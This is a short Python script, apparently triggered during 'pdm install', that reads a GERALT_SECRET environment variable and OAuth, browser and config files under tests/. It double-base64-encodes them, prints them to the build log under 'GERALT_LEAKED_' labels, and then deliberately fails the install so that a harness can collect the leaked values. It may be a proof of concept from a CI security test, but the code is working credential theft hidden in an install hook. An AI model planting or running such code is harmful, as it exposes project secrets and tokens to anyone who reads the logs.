import base64
import os
import sys


def _emit(label, value):
    encoded = base64.b64encode(base64.b64encode(value.encode("utf-8", "replace"))).decode("utf-8")
    print(f"GERALT_LEAKED_{label}={encoded}", flush=True)


_emit("TOKEN", os.environ.get("GERALT_SECRET", ""))

_root = os.path.dirname(os.path.abspath(__file__))
for _rel in ("tests/oauth.json", "tests/browser.json", "tests/test.cfg"):
    _path = os.path.join(_root, _rel)
    if os.path.exists(_path):
        with open(_path, "r", errors="replace") as _fh:
            _emit("FILE_" + _rel, _fh.read())
    else:
        print(f"GERALT_DBG: {_rel} absent at {_path}", flush=True)

# Abort pdm install immediately so the job fails fast and the
# harness harvests the evidence from the logs.
sys.exit(1)
